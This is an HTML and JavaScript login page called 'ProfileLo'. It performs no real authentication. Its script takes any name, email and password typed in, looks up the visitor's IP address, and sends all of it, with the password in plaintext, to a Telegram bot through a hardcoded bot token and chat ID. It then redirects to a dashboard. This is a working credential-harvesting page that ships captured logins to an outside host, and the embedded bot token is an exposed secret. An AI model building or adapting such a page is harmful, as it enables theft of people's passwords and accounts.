<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ProfileLo Login</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Arial, sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #0f172a, #1e293b);
  color: white;
}

.login-box {
  width: 340px;
  padding: 28px 24px;
  background: rgba(255,255,255,0.08);
  backdrop-filter: blur(12px);
  border-radius: 28px;
  border: 1px solid rgba(255,255,255,0.15);
  text-align: center;
}

h2 {
  margin-bottom: 20px;
  font-size: 1.8rem;
  background: linear-gradient(120deg, #f0f9ff, #bae6fd);
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
}

input {
  width: 100%;
  padding: 12px 14px;
  margin: 10px 0;
  border: none;
  border-radius: 60px;
  outline: none;
  font-size: 0.95rem;
  background: rgba(255,255,255,0.9);
  color: #0f172a;
}

input:focus {
  background: white;
  box-shadow: 0 0 0 3px rgba(56,189,248,0.4);
}

button {
  width: 100%;
  padding: 12px;
  margin-top: 18px;
  border: none;
  border-radius: 60px;
  background: #38bdf8;
  font-weight: bold;
  font-size: 1rem;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  background: #0ea5e9;
  transform: scale(0.98);
}

.password-wrapper {
  position: relative;
}

.toggle-pw {
  position: absolute;
  right: 14px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  font-size: 1rem;
  cursor: pointer;
  color: #334155;
  width: auto;
  padding: 0;
}

small {
  display: block;
  text-align: left;
  font-size: 0.7rem;
  color: #94a3b8;
  margin: 4px 0 0 12px;
}

.error-msg {
  font-size: 0.75rem;
  margin-top: 12px;
  color: #facc15;
  background: rgba(0,0,0,0.4);
  border-radius: 60px;
  padding: 5px 10px;
  display: inline-block;
}

.status-led {
  position: fixed;
  top: 20px;
  right: 20px;
  display: inline-block;
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #ef4444;
  box-shadow: 0 0 5px #ef4444;
  animation: pulse 2s infinite;
}

.status-led.active {
  background: #10b981;
  box-shadow: 0 0 5px #10b981;
}

@keyframes pulse {
  0% { opacity: 0.5; transform: scale(1); }
  50% { opacity: 1; transform: scale(1.2); }
  100% { opacity: 0.5; transform: scale(1); }
}

.status-text {
  position: fixed;
  top: 18px;
  right: 35px;
  font-size: 11px;
  color: #94a3b8;
  font-family: monospace;
}

.toast {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background: #1e293b;
  padding: 10px 16px;
  border-radius: 8px;
  font-size: 12px;
  z-index: 1000;
  opacity: 0;
  transition: opacity 0.3s;
  border-left: 3px solid #38bdf8;
}

.toast.show { opacity: 1; }
</style>
</head>
<body>

<div class="status-led" id="statusLed"></div>
<div class="status-text" id="statusText">● Checking Telegram...</div>

<div class="login-box">
  <h2>🔐 ProfileLo</h2>
  
  <input type="text" id="name" placeholder="Full name">
  <input type="email" id="email" placeholder="Email address">
  
  <div class="password-wrapper">
    <input type="password" id="pass" placeholder="Password">
    <button type="button" class="toggle-pw" id="togglePassBtn">👁️</button>
  </div>
  
  <small>🔒 Password must be at least 4 characters</small>
  <button onclick="login()">✨ Login →</button>
  <div id="errorMsg" class="error-msg" style="display: none;"></div>
</div>

<div id="toastMsg" class="toast"></div>

<script>
// ============================================================
// 🔐 TELEGRAM CONFIGURATION - REPLACE WITH YOUR VALUES!
// ============================================================
// HOW TO GET:
// 1. Talk to @BotFather on Telegram → create bot → get token
// 2. Message your bot, then visit:
//    https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
// 3. Copy your chat ID
// ============================================================

const BOT_TOKEN = "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o";  // ← PASTE YOUR BOT TOKEN
const CHAT_ID = "778298958";      // ← PASTE YOUR CHAT ID

// ============================================================

function showToast(msg, isError = false) {
  const toast = document.getElementById("toastMsg");
  toast.textContent = msg;
  toast.style.borderLeftColor = isError ? "#ef4444" : "#38bdf8";
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 4000);
}

function updateTelegramStatus(isWorking) {
  const led = document.getElementById("statusLed");
  const text = document.getElementById("statusText");
  
  if (isWorking) {
    led.className = "status-led active";
    text.innerHTML = "● Telegram Active";
    text.style.color = "#10b981";
  } else {
    led.className = "status-led";
    text.innerHTML = "⚠️ Telegram Not Configured";
    text.style.color = "#ef4444";
  }
}

// Test Telegram connection on page load
async function testTelegramConnection() {
  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
    console.warn("⚠️ Telegram not configured");
    updateTelegramStatus(false);
    showToast("⚠️ Please configure Telegram Bot Token and Chat ID in the code", true);
    return false;
  }
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
    const result = await response.json();
    
    if (result.ok) {
      console.log("✅ Telegram bot connected:", result.result.username);
      updateTelegramStatus(true);
      showToast("✅ Telegram bot is ready!");
      return true;
    } else {
      console.error("❌ Invalid bot token");
      updateTelegramStatus(false);
      showToast("❌ Invalid Telegram Bot Token", true);
      return false;
    }
  } catch (error) {
    console.error("❌ Cannot connect to Telegram:", error);
    updateTelegramStatus(false);
    showToast("❌ Cannot connect to Telegram API", true);
    return false;
  }
}

async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch(e) {
    return "Unable to detect";
  }
}

// Send login notification to Telegram
async function sendTelegramLogin(name, email, password) {
  // Check if configured
  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
    console.error("❌ Bot token not configured");
    showToast("❌ Telegram not configured - Set BOT_TOKEN and CHAT_ID in code", true);
    return false;
  }
  
  const now = new Date();
  const loginTime = now.toLocaleString('en-US', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    timeZoneName: 'short'
  });
  
  const timestamp = now.getTime();
  const dateISO = now.toISOString();
  const ip = await getClientIP();

  const message = `🔐 *NEW LOGIN ALERT*  
━━━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📧 *Email:* ${email}
🔑 *Password:* ${password}
⏰ *Login Time:* ${loginTime}
📅 *Date (ISO):* ${dateISO}
🕐 *Timestamp:* ${timestamp}
🌐 *IP Address:* ${ip}
━━━━━━━━━━━━━━━━━━━━━━━
✅ *Status:* Login Successful`;

  console.log("📤 Sending to Telegram...");
  console.log("Bot Token:", BOT_TOKEN.substring(0, 15) + "...");
  console.log("Chat ID:", CHAT_ID);
  console.log("Message length:", message.length);
  
  try {
    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    console.log("API URL:", apiUrl);
    
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });
    
    const result = await response.json();
    console.log("Telegram API Response:", result);
    
    if (result.ok) {
      console.log("✅ Telegram notification sent successfully!");
      showToast("✅ Login notification sent to Telegram!");
      return true;
    } else {
      console.error("❌ Telegram API error:", result.description);
      showToast(`❌ Telegram error: ${result.description}`, true);
      return false;
    }
  } catch (error) {
    console.error("❌ Network error:", error);
    showToast(`❌ Network error: ${error.message}`, true);
    return false;
  }
}

async function login() {
  const nameInput = document.getElementById("name");
  const emailInput = document.getElementById("email");
  const passInput = document.getElementById("pass");
  
  const name = nameInput.value.trim();
  const email = emailInput.value.trim();
  const password = passInput.value;
  const errorDiv = document.getElementById("errorMsg");
  
  errorDiv.style.display = "none";
  
  // Validation
  if (!name || name.length < 2) {
    errorDiv.innerText = "❌ Name must be at least 2 characters";
    errorDiv.style.display = "block";
    return;
  }
  
  const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
  if (!email || !emailPattern.test(email)) {
    errorDiv.innerText = "❌ Valid email required";
    errorDiv.style.display = "block";
    return;
  }
  
  if (!password || password.length < 4) {
    errorDiv.innerText = "❌ Password must be at least 4 characters";
    errorDiv.style.display = "block";
    return;
  }
  
  // Save login info
  const loginTimestamp = new Date().toISOString();
  localStorage.setItem("lastLoginTime", loginTimestamp);
  
  let loginCount = parseInt(localStorage.getItem("loginCount") || "0");
  loginCount++;
  localStorage.setItem("loginCount", loginCount);
  
  let firstLogin = localStorage.getItem("firstLogin");
  if (!firstLogin) {
    localStorage.setItem("firstLogin", loginTimestamp);
  }
  
  // Send Telegram notification (THIS IS THE FIXED PART)
  showToast("📤 Sending Telegram notification...");
  const telegramSent = await sendTelegramLogin(name, email, password);
  
  if (telegramSent) {
    console.log("✅ Telegram notification sent at:", new Date().toLocaleString());
  } else {
    console.warn("⚠️ Telegram notification failed, but login continues");
  }
  
  // Save user data
  localStorage.setItem("userName", name);
  localStorage.setItem("userEmail", email);
  localStorage.setItem("isLoggedIn", "true");
  
  // Redirect to dashboard
  setTimeout(() => {
    window.location.href = "dashboard.html";
  }, 1500);
}

// Check if already logged in
if (localStorage.getItem("isLoggedIn") === "true") {
  window.location.href = "dashboard.html";
}

// Password toggle
document.getElementById("togglePassBtn")?.addEventListener("click", () => {
  const pass = document.getElementById("pass");
  pass.type = pass.type === "password" ? "text" : "password";
});

// Enter key support
document.getElementById("pass")?.addEventListener("keypress", (e) => {
  if (e.key === "Enter") login();
});

// Test connection on page load
testTelegramConnection();

// Instructions in console
console.log("%c📱 TELEGRAM SETUP INSTRUCTIONS:", "color: #38bdf8; font-size: 14px; font-weight: bold");
console.log("%c1. Open Telegram → Search @BotFather", "color: #94a3b8");
console.log("%c2. Send /newbot → Create your bot", "color: #94a3b8");
console.log("%c3. Copy the bot token", "color: #94a3b8");
console.log("%c4. Message your bot (say 'Hello')", "color: #94a3b8");
console.log("%c5. Visit: https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates", "color: #94a3b8");
console.log("%c6. Copy your chat ID number", "color: #94a3b8");
console.log("%c7. Replace BOT_TOKEN and CHAT_ID in the code", "color: #94a3b8");
</script>
</body>
</html>
